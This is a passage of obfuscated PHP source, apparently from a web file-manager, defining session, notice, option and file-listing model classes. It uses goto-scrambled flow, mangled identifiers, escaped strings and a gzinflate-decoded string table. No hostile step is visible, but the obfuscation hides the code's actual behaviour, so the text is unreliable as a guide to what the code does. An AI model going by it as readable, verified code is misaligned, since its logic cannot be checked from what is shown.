self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[°Óó£ÌİóèÅ][536])) { self::$handle->clearTimeout(); } } } goto E„‚©ì²£¦; fç’×é½²Ú: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\56\x6e\x6f\x74\151\x63\145\x4c\151\x73\164"; public $field = array("\156\141\x6d\145", "\x63\157\x6e\164\145\156\164", "\x61\x75\x74\x68", "\x6d\x6f\x64\x65", "\164\x69\x6d\x65", "\x74\171\x70\x65", "\x73\157\162\164"); public function listData($C ‚Ş½ÚÔ» = false, $cÔâ±­¦Óµ = "\163\x6f\162\164", $Bµ±Ÿ¼—«¡ = false) { return parent::listData($C ‚Ş½ÚÔ», $cÔâ±­¦Óµ, $Bµ±Ÿ¼—«¡); } public function add($bŞ‘ØÙ®´ğ) { goto dŠŒÂ‡¨ë•; BÎ›Ÿğîí: $d÷Â¾³Ã¿ê = time(); if ($bŞ‘ØÙ®´ğ[$cÅÒĞíÓ‹[12]] == $cÅÒĞíÓ‹[1899]) { $d÷Â¾³Ã¿ê = strtotime($bŞ‘ØÙ®´ğ[$cÅÒĞíÓ‹[198]]); } $bŞ‘ØÙ®´ğ[$cÅÒĞíÓ‹[198]] = $d÷Â¾³Ã¿ê; goto aÈµ¿¯§¢¥; aÈµ¿¯§¢¥: return parent::insert($bŞ‘ØÙ®´ğ); goto E¡Æ†ïšÂ; dŠŒÂ‡¨ë•: $cÅÒĞíÓ‹ =& $_SERVER[°Óó£ÌİóèÅ]; $F†ŒŠ±¥˜ = $this->findByName($bŞ‘ØÙ®´ğ[$cÅÒĞíÓ‹[28]]); if ($F†ŒŠ±¥˜) { return !1; } goto BÎ›Ÿğîí; E¡Æ†ïšÂ: } public function update($f‚—ĞÜôŒ¿, $bÁÆ‚•Ÿ¸) { goto bïÔéİ¡êë; b·ßíÒ©: if (!$f„‘èƒ½¬ë || $d‡ÎÒóÍ¸ñ && $d‡ÎÒóÍ¸ñ[$CÉÉÕÛêÔ[376]] != $f„‘èƒ½¬ë[$CÉÉÕÛêÔ[376]]) { return !1; } $aå¾ĞÄ‰† = time(); if ($bÁÆ‚•Ÿ¸[$CÉÉÕÛêÔ[12]] == $CÉÉÕÛêÔ[1899]) { $aå¾ĞÄ‰† = strtotime($bÁÆ‚•Ÿ¸[$CÉÉÕÛêÔ[198]]); } goto cïÒíÀñ°ö; cïÒíÀñ°ö: $bÁÆ‚•Ÿ¸[$CÉÉÕÛêÔ[198]] = $aå¾ĞÄ‰†; return parent::update($f‚—ĞÜôŒ¿, $bÁÆ‚•Ÿ¸); goto F™’ÜÍÇßè; bïÔéİ¡êë: $CÉÉÕÛêÔ =& $_SERVER[°Óó£ÌİóèÅ]; $f„‘èƒ½¬ë = $this->listData($f‚—ĞÜôŒ¿); $d‡ÎÒóÍ¸ñ = $this->findByName($bÁÆ‚•Ÿ¸[$CÉÉÕÛêÔ[28]]); goto b·ßíÒ©; F™’ÜÍÇßè: } public function remove($fÏìàŸ†•‚) { $b“Ø«¡Òİ = $this->listData($fÏìàŸ†•‚); if (!$b“Ø«¡Òİ || $b“Ø«¡Òİ[$_SERVER[°Óó£ÌİóèÅ][824]]) { return !1; } return parent::remove($fÏìàŸ†•‚); } public function sort($DòÜ†ˆ², $fàå³’ÚË”) { return parent::update($DòÜ†ˆ², $fàå³’ÚË”); } private function initUserOption() { $A‡ÍÕ¾ï‚Ê =& $_SERVER[°Óó£ÌİóèÅ]; $this->optionType = $A‡ÍÕ¾ï‚Ê[1900]; $this->modelType = $A‡ÍÕ¾ï‚Ê[1901]; $this->field = array($A‡ÍÕ¾ï‚Ê[1902], $A‡ÍÕ¾ï‚Ê[28], $A‡ÍÕ¾ï‚Ê[198], $A‡ÍÕ¾ï‚Ê[29], $A‡ÍÕ¾ï‚Ê[454], $A‡ÍÕ¾ï‚Ê[188]); } public function userNoticeGet($AÎØ’õ‡† = false) { $this->initUserOption(); return parent::listData($AÎØ’õ‡†, $_SERVER[°Óó£ÌİóèÅ][376], !0); } public function userNoticeAdd($BÂØ›—ÆÉÊ) { $Dä„®‚©“• =& $_SERVER[°Óó£ÌİóèÅ]; $this->initUserOption(); $E“£Õ•«á = $this->findByKey($Dä„®‚©“•[1902], $BÂØ›—ÆÉÊ[$Dä„®‚©“•[376]]); if ($E“£Õ•«á) { return !0; } $E¦’”Ó’Šƒ = array($Dä„®‚©“•[1902] => $BÂØ›—ÆÉÊ[$Dä„®‚©“•[376]], $Dä„®‚©“•[28] => $BÂØ›—ÆÉÊ[$Dä„®‚©“•[28]], $Dä„®‚©“•[198] => $BÂØ›—ÆÉÊ[$Dä„®‚©“•[198]], $Dä„®‚©“•[29] => isset($BÂØ›—ÆÉÊ[$Dä„®‚©“•[29]]) ? $BÂØ›—ÆÉÊ[$Dä„®‚©“•[29]] : 1, $Dä„®‚©“•[454] => 0, $Dä„®‚©“•[188] => 0); return parent::insert($E¦’”Ó’Šƒ); } public function userNoticeEdit($C§ÕÉƒø±ô, $bò«‘ò‡ó) { $this->initUserOption(); return parent::update($C§ÕÉƒø±ô, $bò«‘ò‡ó); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\145\155\137\157\160\x74\151\157\156"; protected $jsonField = array("\x6d\145\x6e\165", "\162\x6f\x6c\x65", "\162\157\154\x65\107\162\157\x75\160", "\x72\145\147\151\163\x74", "\x65\155\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($Aª¡½ÌÄ„) { return "\x53\171\163\164\145\155\x4f\x70\164\x69\x6f\x6e\137{$Aª¡½ÌÄ„}"; } } class SystemRecordModel extends ModelBaseLight { } goto fãŠÑ§ù‹®; aÎ˜Ş‚£ºù: $_SERVER[øü€åÏá™†Ôà] = explode($_SERVER[°Óó£ÌİóèÅ][379], gzinflate(substr($_SERVER[°Óó£ÌİóèÅ][380], 10, -8))); class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\x75\162\143\145"; protected $tableMeta = array("\164\141\142\154\145\116\x61\x6d\x65" => "\151\x6f\137\x73\157\x75\162\x63\145\x5f\x6d\145\164\141", "\155\145\164\x61\x46\x69\145\x6c\x64" => "\x73\157\x75\162\x63\x65\x49\x44"); protected $dataAuto = array(array("\x6d\157\x64\151\x66\x79\x54\151\x6d\145", "\164\151\155\x65", "\151\x6e\163\x65\162\164", "\x66\x75\156\143\164\151\x6f\156"), array("\143\x72\x65\141\x74\x65\124\151\x6d\x65", "\x74\151\155\145", "\151\156\x73\x65\x72\x74", "\x66\165\156\143\164\x69\157\x6e"), array("\166\x69\145\167\x54\x69\155\x65", "\x74\x69\x6d\x65", "\x69\x6e\x73\145\162\164", "\146\x75\x6e\143\164\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($FŞ‰Ç¢Õ) { return $this->listSource(array($_SERVER[øü€åÏá™†Ôà][0] => $FŞ‰Ç¢Õ)); } public function typeName($f³ÒÖ…Àà) { static $Bà¿Ø„„Òå = array(self::TYPE_SYSTEM => "\x73\171\163\164\x65\155", self::TYPE_USER => "\165\163\145\162", self::TYPE_GROUP => "\147\162\x6f\165\x70"); return $Bà¿Ø„„Òå[$f³ÒÖ…Àà . $_SERVER[øü€åÏá™†Ôà][1]]; } public function sourceListInfo($FÓŞ ˆ°, $cÅÙ§ÍÚÍŒ = false) { goto aŠ†îƒô©Ñ; EÂŠÄé‡ƒ¢: $a˜…ˆÎôƒÕ = $this->where(array($f£œóè‰­À[2] => array($f£œóè‰­À[3], $FÓŞ ˆ°)))->select(); $this->_listAppendAuth($a˜…ˆÎôƒÕ); $this->_listAppendSourceInfo($a˜…ˆÎôƒÕ, $FÓŞ ˆ°); goto cÑí§ö‰Õ‰; cÑí§ö‰Õ‰: if (!$cÅÙ§ÍÚÍŒ) { $this->_listAppendMeta($a˜…ˆÎôƒÕ, $FÓŞ ˆ°); $this->_listAppendChildren($a˜…ˆÎôƒÕ, $FÓŞ ˆ°); } $this->_listAppendUser($a˜…ˆÎôƒÕ); $this->_listAppendPath($a˜…ˆÎôƒÕ); goto EÎ¾«Ï³éï; EÎ¾«Ï³éï: foreach ($a˜…ˆÎôƒÕ as &$b¯Äê‹™œÎ) { $b¯Äê‹™œÎ = $this->pathInfoFilter($b¯Äê‹™œÎ); } $FÒ¦Ï¬Ã“ = array_to_keyvalue($a˜…ˆÎôƒÕ, $f£œóè‰­À[2]); return $FÒ¦Ï¬Ã“; goto eöÇáó›Ä; aŠ†îƒô©Ñ: $f£œóè‰­À =& $_SERVER[øü€åÏá™†Ôà]; $FÓŞ ˆ° = array_filter(array_unique($FÓŞ ˆ°)); if (!$FÓŞ ˆ°) { return array(); } goto EÂŠÄé‡ƒ¢; eöÇáó›Ä: } public function pathInfoFilter($eÑ¿åÍ¦»Ó) { goto Cí”…Îòƒ; aîßİ³ Ë: $eÑ¿åÍ¦»Ó[$B²òç[9]] = $this->typeName($eÑ¿åÍ¦»Ó[$B²òç[9]]); if ($eÑ¿åÍ¦»Ó[$B²òç[6]] != 1) { $eÑ¿åÍ¦»Ó[$B²òç[10]] = $eÑ¿åÍ¦»Ó[$B²òç[11]]; unset($eÑ¿åÍ¦»Ó[$B²òç[11]]); } $cË°éºŒ›° = $B²òç[12]; goto DàĞ¡ôğì; DàĞ¡ôğì: $cË°éºŒ›° .= $B²òç[13]; $cË°éºŒ›° .= $B²òç[14]; $b¶†’Ÿóå­ = explode($B²òç[15], $cË°éºŒ›°); goto c´ç®¨Şò; c´ç®¨Şò: if ($eÑ¿åÍ¦»Ó[$B²òç[16]] && $eÑ¿åÍ¦»Ó[$B²òç[16]][$B²òç[17]] == -1) { $b¶†’Ÿóå­ = array_remove_value($b¶†’Ÿóå­, $B²òç[18]); $b¶†’Ÿóå­ = array_remove_value($b¶†’Ÿóå­, $B²òç[19]); $b¶†’Ÿóå­ = array_remove_value($b¶†’Ÿóå­, $B²òç[20]); $b¶†’Ÿóå­ = array_remove_value($b¶†’Ÿóå­, $B²òç[21]); $b¶†’Ÿóå­ = array_remove_value($b¶†’Ÿóå­, $B²òç[22]); $b¶†’Ÿóå­ = array_remove_value($b¶†’Ÿóå­, $B²òç[23]); } $eÑ¿åÍ¦»Ó = array_field_key($eÑ¿åÍ¦»Ó, $b¶†’Ÿóå­); return $eÑ¿åÍ¦»Ó; goto F©ƒ Œâƒ; Cí”…Îòƒ: $B²òç =& $_SERVER[øü€åÏá™†Ôà]; $eÑ¿åÍ¦»Ó[$B²òç[4]] = KodIO::make($eÑ¿åÍ¦»Ó[$B²òç[2]]); $eÑ¿åÍ¦»Ó[$B²òç[5]] = $eÑ¿åÍ¦»Ó[$B²òç[6]] == 1 ? $B²òç[7] : $B²òç[8]; goto aîßİ³ Ë; F©ƒ Œâƒ: } public function listUserFav() { goto aŒÙ‚ñ†Ç; B°èÑæŠÙ‘: $F«÷š¡½äŸ = array_to_keyvalue($F«÷š¡½äŸ, $Bƒõªñ‹Ë[1], $Bƒõªñ‹Ë[4]); if ($F«÷š¡½äŸ) { $aê‰½êÆ‘ = $this->listSource(array($Bƒõªñ‹Ë[26] => array($Bƒõªñ‹Ë[27], $F«÷š¡½äŸ))); } $aê‰½êÆ‘ = array_to_keyvalue($aê‰½êÆ‘[$Bƒõªñ‹Ë[28]], $Bƒõªñ‹Ë[2]); goto B²·©éäĞ½; B²·©éäĞ½: foreach ($E‰‘Øå“ÂÙ as &$e£º¶ò„õ) { $e£º¶ò„õ = array($Bƒõªñ‹Ë[29] => $e£º¶ò„õ[$Bƒõªñ‹Ë[30]], $Bƒõªñ‹Ë[31] => $e£º¶ò„õ[$Bƒõªñ‹Ë[32]], $Bƒõªñ‹Ë[33] => $e£º¶ò„õ[$Bƒõªñ‹Ë[4]], $Bƒõªñ‹Ë[34] => $e£º¶ò„õ[$Bƒõªñ‹Ë[5]], $Bƒõªñ‹Ë[35] => $e£º¶ò„õ[$Bƒõªñ‹Ë[18]], $Bƒõªñ‹Ë[36] => $e£º¶ò„õ[$Bƒõªñ‹Ë[19]]); if ($e£º¶ò„õ[$Bƒõªñ‹Ë[5]] == $Bƒõªñ‹Ë[25] && $aê‰½êÆ‘[$e£º¶ò„õ[$Bƒõªñ‹Ë[4]]]) { $e£º¶ò„õ[$Bƒõªñ‹Ë[37]] = $aê‰½êÆ‘[$e£º¶ò„õ[$Bƒõªñ‹Ë[4]]]; } } return $E‰‘Øå“ÂÙ; goto dàÂÎ—²ÂÍ; aŒÙ‚ñ†Ç: $Bƒõªñ‹Ë =& $_SERVER[øü€åÏá™†Ôà]; $E‰‘Øå“ÂÙ = Model($Bƒõªñ‹Ë[24])->listData(); $F«÷š¡½äŸ = array_filter_by_field($E‰‘Øå“ÂÙ, $Bƒõªñ‹Ë[5], $Bƒõªñ‹Ë[25]); goto B°èÑæŠÙ‘; dàÂÎ—²ÂÍ: } public function listUserTag($bç‡Ší‘ÊÎ) { goto a—‘°ÂÁí¼; a—‘°ÂÁí¼: $dÀİºêŸ°Ë =& $_SERVER[øü€åÏá™†Ôà]; $b ›Ü„–Ö¼ = Model($dÀİºêŸ°Ë[38])->listData(); $fÓ·ïß¬³ = array_filter_by_field($b ›Ü„–Ö¼, $dÀİºêŸ°Ë[39], $bç‡Ší‘ÊÎ); goto cÄ’ùÀÌ¿; cÄ’ùÀÌ¿: $fÓ·ïß¬³ = array_to_keyvalue($fÓ·ïß¬³, $dÀİºêŸ°Ë[1], $dÀİºêŸ°Ë[4]); if (!$fÓ·ïß¬³) { return array(); } $F†¾Œ“ğ²º = array($dÀİºêŸ°Ë[26] => array($dÀİºêŸ°Ë[27], $fÓ·ïß¬³)); goto dÈ§òòã; dÈ§òòã: return $this->listSource($F†¾Œ“ğ²º); goto c®…ÛÑœ»; c®…ÛÑœ»: } public function listUserRecycle() { $Dİ´à±™ƒô =& $_SERVER[øü€åÏá™†Ôà]; $bÄÜµøÅÈå = Model($Dİ´à±™ƒô[40])->listData(); if (!$bÄÜµøÅÈå) { return array(); } $F‡‹¡ö¡êå = array($Dİ´à±™ƒô[26] => array($Dİ´à±™ƒô[27], $bÄÜµøÅÈå), $Dİ´à±™ƒô[41] => 1); return $this->listSource($F‡‹¡ö¡êå); } public function listSource($B½‚ÌÁÊ°º, $a±±×”Ô®™ = 3000) { goto BÑÜã…©ë; BÑÜã…©ë: $fÂ°’¥ê‹Ï =& $_SERVER[øü€åÏá™†Ôà]; if (!isset($B½‚ÌÁÊ°º[$fÂ°’¥ê‹Ï[42]])) { $B½‚ÌÁÊ°º[$fÂ°’¥ê‹Ï[42]] = 0; } $C“àÖé™ŞÍ = $fÂ°’¥ê‹Ï[43]; goto DĞ¼“š–ÄÄ; DĞ¼“š–ÄÄ: $FÀ¹ÌÃÙ‰ = $this->field($C“àÖé™ŞÍ)->_makeOrder()->where($B½‚ÌÁÊ°º)->selectPage($a±±×”Ô®™); $this->_listDataApply($FÀ¹ÌÃÙ‰[$fÂ°’¥ê‹Ï[28]]); $this->_listFilterInfo($FÀ¹ÌÃÙ‰); goto E¹•¢‰Æ¶½; E¹•¢‰Æ¶½: return $FÀ¹ÌÃÙ‰; goto dçÉ„ùµ¯; dçÉ„ùµ¯: } protected function _makeOrder() { goto e¨Ò—“¥ÜÖ; cê±ø”æßí: if ($Båà²Í“ŞÔ == $b¼¾˜‡šåœ[32]) { } $C¥ÛÂŠÆæŒ = $b¼¾˜‡šåœ[54] . $Fç©É«‡Ï[$Båà²Í“ŞÔ] . $b¼¾˜‡šåœ[55] . $E¾Šö”‚¬£[$C¼ùÇÔŠ¤é]; return $this->order(rtrim(trim($C¥ÛÂŠÆæŒ), $b¼¾˜‡šåœ[15])); goto BêĞ†™‰£Ğ; e¨Ò—“¥ÜÖ: $b¼¾˜‡šåœ =& $_SERVER[øü€åÏá™†Ôà]; $cãÆ°ß‹ëâ = Model($b¼¾˜‡šåœ[44])->get($b¼¾˜‡šåœ[45]); $eá–ì‘Ÿï = Model($b¼¾˜‡šåœ[44])->get($b¼¾˜‡šåœ[46]); goto B§³¾–‹Ü–; Aİà‡´¸Æ¸: $C¼ùÇÔŠ¤é = Input::get($b¼¾˜‡šåœ[53], $b¼¾˜‡šåœ[3], $eá–ì‘Ÿï, array_keys($E¾Šö”‚¬£)); if (!in_array($Båà²Í“ŞÔ, array_keys($Fç©É«‡Ï))) { $Båà²Í“ŞÔ = $b¼¾˜‡šåœ[32]; } if (!in_array($C¼ùÇÔŠ¤é, array_keys($E¾Šö”‚¬£))) { $Båà²Í“ŞÔ = $b¼¾˜‡šåœ[47]; } goto cê±ø”æßí; B§³¾–‹Ü–: $E¾Šö”‚¬£ = array($b¼¾˜‡šåœ[47] => $b¼¾˜‡šåœ[48], $b¼¾˜‡šåœ[49] => $b¼¾˜‡šåœ[50]); $Fç©É«‡Ï = array($b¼¾˜‡šåœ[32] => $b¼¾˜‡šåœ[32], $b¼¾˜‡šåœ[22] => $b¼¾˜‡šåœ[22], $b¼¾˜‡šåœ[10] => $b¼¾˜‡šåœ[11], $b¼¾˜‡šåœ[20] => $b¼¾˜‡šåœ[20], $b¼¾˜‡šåœ[51] => $b¼¾˜‡šåœ[21], $b¼¾˜‡šåœ[18] => $b¼¾˜‡šåœ[18], $b¼¾˜‡šåœ[19] => $b¼¾˜‡šåœ[19]); $Båà²Í“ŞÔ = Input::get($b¼¾˜‡šåœ[52], $b¼¾˜‡šåœ[3], $cãÆ°ß‹ëâ, array_keys($Fç©É«‡Ï)); goto Aİà‡´¸Æ¸; BêĞ†™‰£Ğ: } protected function _listDataApplyItem($c«Š®ÅÜ»Ä, $eÍÜ£ëÜô¦ = false) { goto d‚”‘™íğª; CÔ¶ñ¢ªÎÃ: if (!$eÍÜ£ëÜô¦) { $this->_listAppendMeta($E—äØµÊè, $D‹º´Ã¡Ä±); $this->_listAppendChildren($E—äØµÊè, $D‹º´Ã¡Ä±); $this->_listAppendPath($E—äØµÊè); } $this->_listAppendSourceInfo($E—äØµÊè, $D‹º´Ã¡Ä±); $this->_listAppendUser($E—äØµÊè); goto A´âÕéİìø; d‚”‘™íğª: $E—äØµÊè = array($c«Š®ÅÜ»Ä); $D‹º´Ã¡Ä± = array($c«Š®ÅÜ»Ä[$_SERVER[øü€åÏá™†Ôà][2]]); $this->_listAppendAuth($E—äØµÊè); goto CÔ¶ñ¢ªÎÃ; A´âÕéİìø: $dù»¡¾‹ŒÓ = $this->pathInfoFilter($E—äØµÊè[0]); return $dù»¡¾‹ŒÓ; goto Cƒ¥ê†•–‹; Cƒ¥ê†•–‹: } protected function _listDataApply(&$F£È¿µ®ŠÓ) { goto eè«İğì†Õ; BÉ“éµ ¸: $this->_listAppendSourceInfo($F£È¿µ®ŠÓ, $d™ÔƒŸ); $this->_listAppendChildren($F£È¿µ®ŠÓ, $d™ÔƒŸ); $this->_listAppendUser($F£È¿µ®ŠÓ); goto aŞã¥Ğİ°; Bˆ´Ã°¥“: $d™ÔƒŸ = array_unique($d™ÔƒŸ); $this->_listAppendAuth($F£È¿µ®ŠÓ); $this->_listAppendMeta($F£È¿µ®ŠÓ, $d™ÔƒŸ); goto BÉ“éµ ¸; eè«İğì†Õ: $A‹¾õ¬ŠÚ =& $_SERVER[øü€åÏá™†Ôà]; if (!$F£È¿µ®ŠÓ) { $F£È¿µ®ŠÓ = array(); return; } $d™ÔƒŸ = array_to_keyvalue($F£È¿µ®ŠÓ, $A‹¾õ¬ŠÚ[1], $A‹¾õ¬ŠÚ[2]); goto Bˆ´Ã°¥“; aŞã¥Ğİ°: $this->_listAppendPath($F£È¿µ®ŠÓ); goto fãÍˆ¬—Ñ‡; fãÍˆ¬—Ñ‡: } protected function _listFilterInfo(&$DÁß…ÜõÀ´) { $BïÅÊ»¨¡å =& $_SERVER[øü€åÏá™†Ôà]; $DÁß…ÜõÀ´[$BïÅÊ»¨¡å[56]] = array(); $DÁß…ÜõÀ´[$BïÅÊ»¨¡å[57]] = array(); foreach ($DÁß…ÜõÀ´[$BïÅÊ»¨¡å[28]] as $e‡çà…š¢Š) { $F°ˆ¸ìİØ = $e‡çà…š¢Š[$BïÅÊ»¨¡å[6]] == 1 ? $BïÅÊ»¨¡å[56] : $BïÅÊ»¨¡å[57]; $DÁß…ÜõÀ´[$F°ˆ¸ìİØ][] = $this->pathInfoFilter($e‡çà…š¢Š); } unset($DÁß…ÜõÀ´[$BïÅÊ»¨¡å[28]]); } protected function _listAppendMeta(&$bÃÓ½ŞÎŠÄ, $f›Êæø¶º) { goto DçÊö¥¡¸; DçÊö¥¡¸: $C£šà­Ù§÷ =& $_SERVER[øü€åÏá™†Ôà]; $FŒæÕ‡ä = array($C£šà­Ù§÷[26] => array($C£šà­Ù§÷[27], $f›Êæø¶º)); $F·ø«‹äçµ = Model($C£šà­Ù§÷[58])->field($C£šà­Ù§÷[59])->where($FŒæÕ‡ä)->select(); goto b½ˆ›äªô§; a¹“íšÓ‰: foreach ($bÃÓ½ŞÎŠÄ as &$Cê„Éš—„è) { $Cê„Éš—„è[$C£šà­Ù§÷[62]] = !1; if (isset($EÄà ëñÖ…[$Cê„Éš—„è[$C£šà­Ù§÷[2]]])) { $Cê„Éš—„è[$C£šà­Ù§÷[62]] = $EÄà ëñÖ…[$Cê„Éš—„è[$C£šà­Ù§÷[2]]]; } if ($this->fileIsLock($Cê„Éš—„è) && $Cê„Éš—„è[$C£šà­Ù§÷[16]]) { $a†İ°„…ô’ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Cê„Éš—„è[$C£šà­Ù§÷[16]][$C£šà­Ù§÷[17]] = AuthModel::authDisable($Cê„Éš—„è[$C£šà­Ù§÷[16]][$C£šà­Ù§÷[17]], $a†İ°„…ô’); $Cê„Éš—„è[$C£šà­Ù§÷[16]][$C£šà­Ù§÷[63]][$C£šà­Ù§÷[16]] = $Cê„Éš—„è[$C£šà­Ù§÷[16]][$C£šà­Ù§÷[17]]; } } goto AÁ‡Úø; b½ˆ›äªô§: if (!$F·ø«‹äçµ) { return; } $EÄà ëñÖ… = array(); foreach ($F·ø«‹äçµ as $FßíÇ¶) { if (!isset($EÄà ëñÖ…[$FßíÇ¶[$C£šà­Ù§÷[2]]])) { $EÄà ëñÖ…[$FßíÇ¶[$C£šà­Ù§÷[2]]] = array(); } $EÄà ëñÖ…[$FßíÇ¶[$C£šà­Ù§÷[2]]][$FßíÇ¶[$C£šà­Ù§÷[60]]] = $FßíÇ¶[$C£šà­Ù§÷[61]]; } goto a¹“íšÓ‰; AÁ‡Úø: } protected function _listAppendSourceInfo(&$FÃİ…ìéÌĞ, $D–ÓïÄƒŸò) { goto Eß„ôæ«°ß; C‚ùé‘ÅªÚ: $bø»Œ½÷Ã = array_to_keyvalue_group($FÛ¼Ú¥Â™Ü, $aä©¨‡´Ú·[4], $aä©¨‡´Ú·[39]); $fº¸Šœ—Àß = array_to_keyvalue($dÌ‘ïƒ¼Ğá, $aä©¨‡´Ú·[4]); $C¨ùÔÌ“Ñè = array_to_keyvalue_group($Aöâ˜ƒ„‘¤, $aä©¨‡´Ú·[2]); goto E É»¾øËÂ; Eß„ôæ«°ß: $aä©¨‡´Ú· =& $_SERVER[øü€åÏá™†Ôà]; $d›‘†×ÂÓ¯ = Model($aä©¨‡´Ú·[64])->listData(); $FÛ¼Ú¥Â™Ü = Model($aä©¨‡´Ú·[38])->listData(); goto EÁíÕŒ¸øŸ; E É»¾øËÂ: foreach ($FÃİ…ìéÌĞ as &$D°ëÑíÇ„) { $D°ëÑíÇ„[$aä©¨‡´Ú·[37]] = array($aä©¨‡´Ú·[66] => 0, $aä©¨‡´Ú·[67] => 0, $aä©¨‡´Ú·[68] => 0); if (isset($fº¸Šœ—Àß[$D°ëÑíÇ„[$aä©¨‡´Ú·[2]]])) { $D°ëÑíÇ„[$aä©¨‡´Ú·[37]][$aä©¨‡´Ú·[69]] = 1; $D°ëÑíÇ„[$aä©¨‡´Ú·[37]][$aä©¨‡´Ú·[70]] = $fº¸Šœ—Àß[$D°ëÑíÇ„[$aä©¨‡´Ú·[2]]][$aä©¨‡´Ú·[32]]; } if (isset($bø»Œ½÷Ã[$D°ëÑíÇ„[$aä©¨‡´Ú·[2]]])) { $D°ëÑíÇ„[$aä©¨‡´Ú·[37]][$aä©¨‡´Ú·[71]] = array(); foreach ($bø»Œ½÷Ã[$D°ëÑíÇ„[$aä©¨‡´Ú·[2]]] as $DÊ¬–ãğ) { $Fù¬Ò”ê¿² = $D¼÷œÚ[$DÊ¬–ãğ]; $D°ëÑíÇ„[$aä©¨‡´Ú·[37]][$aä©¨‡´Ú·[71]][] = array($aä©¨‡´Ú·[72] => $Fù¬Ò”ê¿²[$aä©¨‡´Ú·[30]], $aä©¨‡´Ú·[31] => $Fù¬Ò”ê¿²[$aä©¨‡´Ú·[32]], $aä©¨‡´Ú·[73] => $Fù¬Ò”ê¿²[$aä©¨‡´Ú·[74]]); } } if (isset($C¨ùÔÌ“Ñè[$D°ëÑíÇ„[$aä©¨‡´Ú·[2]]])) { $D°ëÑíÇ„[$aä©¨‡´Ú·[37]][$aä©¨‡´Ú·[75]] = array(); foreach ($C¨ùÔÌ“Ñè[$D°ëÑíÇ„[$aä©¨‡´Ú·[2]]] as $Añà–ë¢¸”) { $D°ëÑíÇ„[$aä©¨‡´Ú·[37]][$aä©¨‡´Ú·[75]] = array($aä©¨‡´Ú·[76] => $Añà–ë¢¸”[$aä©¨‡´Ú·[77]], $aä©¨‡´Ú·[78] => $Añà–ë¢¸”[$aä©¨‡´Ú·[79]], $aä©¨‡´Ú·[80] => $Añà–ë¢¸”[$aä©¨‡´Ú·[2]], $aä©¨‡´Ú·[81] => $Añà–ë¢¸”[$aä©¨‡´Ú·[82]], $aä©¨‡´Ú·[83] => $Añà–ë¢¸”[$aä©¨‡´Ú·[84]]); } } } return $FÃİ…ìéÌĞ; goto cÊŸªç‰š¤; EÁíÕŒ¸øŸ: $dÌ‘ïƒ¼Ğá = Model($aä©¨‡´Ú·[24])->listData(); $Aöâ˜ƒ„‘¤ = Model($aä©¨‡´Ú·[65])->listSimple(); $D¼÷œÚ = array_to_keyvalue($d›‘†×ÂÓ¯, $aä©¨‡´Ú·[30]); goto C‚ùé‘ÅªÚ; cÊŸªç‰š¤: } protected function _listAppendChildren(&$Eù²–ä¡ĞŒ, $eñ±í¡ÖÑË) { goto CÅÄ¢•â§Ş; CÛÈÜÕÙ˜: for ($F¦½¹Ñ—‹ = 0; $F¦½¹Ñ—‹ < $EóöÎóˆƒ; $F¦½¹Ñ—‹++) { if ($Eù²–ä¡ĞŒ[$F¦½¹Ñ—‹][$F§·”Ò¤¦Ë[6]]) { $B´ÄŒˆ½ÆÔ = $Eù²–ä¡ĞŒ[$F¦½¹Ñ—‹][$F§·”Ò¤¦Ë[2]]; $C±¸Ïš£ .= "\x53\105\114\x45\103\x54\40\x2a\40\x46\x52\117\115\40\x28\123\x45\114\x45\103\124\x20\x27{$B´ÄŒˆ½ÆÔ}\137\x68\x61\x73\x46\x69\154\x65\x27\40\141\163\40\x68\141\x73\54\143\157\165\156\164\50\61\51\x20\x61\x73\x20\150\141\x73\x43\x6f\165\x6e\x74\x20\x46\122\117\115\40\140{$BµŠàæ—Ø}\x60\x20\xa\x9\11\x9\11\11\x77\x68\x65\x72\x65\40\x70\141\x72\x65\156\164\x49\x44\x3d{$B´ÄŒˆ½ÆÔ}\x20\141\x6e\144\40\x69\163\106\157\x6c\144\145\162\75\60\40\141\156\x64\x20\151\x73\x44\x65\x6c\x65\164\x65\x3d\x30\51\40\x61\163\40\164\142\x31\x5f{$B´ÄŒˆ½ÆÔ}\x20\x75\x6e\x69\x6f\x6e\40\141\x6c\154\40\12\x9\11\11\x9\x9\123\x45\x4c\105\x43\124\40\52\40\106\x52\x4f\115\x20\50\123\x45\114\x45\x43\124\40\x27{$B´ÄŒˆ½ÆÔ}\x5f\x68\141\x73\x46\x6f\154\x64\145\162\x27\x20\x61\163\40\150\141\163\106\151\x6c\x65\x2c\x63\157\165\x6e\x74\x28\61\x29\40\x61\163\x20\150\141\163\x43\157\x75\156\164\x20\x46\122\x4f\115\40\140{$BµŠàæ—Ø}\140\40\12\11\x9\11\x9\x9\167\x68\145\162\x65\x20\x70\x61\162\x65\156\x74\111\104\x3d{$B´ÄŒˆ½ÆÔ}\x20\141\x6e\x64\x20\x69\x73\106\x6f\154\144\x65\x72\x3d\x31\40\141\156\x64\x20\x69\x73\104\x65\154\x65\x74\145\x3d\x30\x29\40\x61\x73\x20\164\142\x32\137{$B´ÄŒˆ½ÆÔ}\40\165\x6e\151\x6f\156\x20\x61\154\x6c\x20"; } if ((strlen($C±¸Ïš£) >= $EˆŠùˆëšß || $F¦½¹Ñ—‹ == $EóöÎóˆƒ - 1) && $C±¸Ïš£) { $C±¸Ïš£ = substr($C±¸Ïš£, 0, -strlen($F§·”Ò¤¦Ë[86])); $eÄÈ‘î‚ÉÀ = $this->query($C±¸Ïš£); $Còé¹¦ŠÓ› = array_merge($Còé¹¦ŠÓ›, $eÄÈ‘î‚ÉÀ); $C±¸Ïš£ = $F§·”Ò¤¦Ë[1]; } } $Còé¹¦ŠÓ› = array_to_keyvalue($Còé¹¦ŠÓ›, $F§·”Ò¤¦Ë[87]); foreach ($Eù²–ä¡ĞŒ as &$DÓ…Ëè¾­Ü) { if ($DÓ…Ëè¾­Ü[$F§·”Ò¤¦Ë[6]]) { unset($DÓ…Ëè¾­Ü[$F§·”Ò¤¦Ë[11]]); 